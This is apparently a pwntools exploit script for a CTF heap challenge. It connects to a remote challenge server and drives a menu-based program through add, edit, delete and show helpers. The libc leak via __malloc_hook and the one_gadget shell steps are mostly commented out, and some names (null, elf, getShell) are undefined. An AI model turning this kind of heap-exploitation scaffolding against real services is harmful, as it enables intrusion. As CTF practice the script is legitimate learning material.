# -*- encoding: utf-8 -*-
from pwn import * 
context.log_level = 'debug'
libc = ELF('/home/niyah/glibc-all-in-one/libs/2.23-0ubuntu11.2_amd64/libc-2.23.so')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    # p = process(binary)
else:
    host = 'redirect.do-not-trust.hacking.run'
    port = '10380'
    p = remote(host,port)


l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def ras( data ):
    lg('leak' , data)
    return data


def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('choice:',num)

def add(size1 , size2 , text1 = 'a' , text2 = 'b'):
    cmd(1)
    sla('size.' , size1)
    sla('commodity.' , text1)
    sla('size.' , size2)
    sla('commodity-name.' , text2)

def edit(idx, text1  , text2):
    cmd(2)
    sla(' index is ' , idx)
    sa('name.' , text1)
    sa('desrcription.' , text2)

def editOne(idx , text2):
    cmd(2)
    sla(' index is ' , idx)
    sa('desrcription.' , text2)

def editName(text):
    cmd(6)
    sa('name(1~32):' , text)

def delete(idx):
    cmd(5)
    cmd(2)
    sla(' index is ' , idx)

def show():
    cmd(3)
    cmd(1)

one_gad = one_gadget(libc.path)

def attack():
    
    sa('name(1~32):' , 'a'*32)
    # add(0x418 , 0x4b8 )
    # add(0x18 , 0x18 )
    # editName('b'*0x20)


    show()
    # ru('a'*0x20)
    # heap_base = uu64(6) & 0xfffffffff000

    # delete(0)
    # add(0x418 , 0x3c8 )
    # add(0x68 , 0x68 , '1' , '2')
    # editName('b'*0x20)

    # show()
    # edit(1 , 'a'*0x8 , 'b'*0x8)
    # show()
    # __malloc_hook = l64() - 0x488
    # libc.address =__malloc_hook -  libc.sym['__malloc_hook']
    # ogg = one_gad[1] + libc.address

    # delete(0)
    # delete(1)

    # cmd(4)

    # show()


    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   bindheap.py
@Time    :   2022/01/20 14:12:07
@Author  :   Niyah 
'''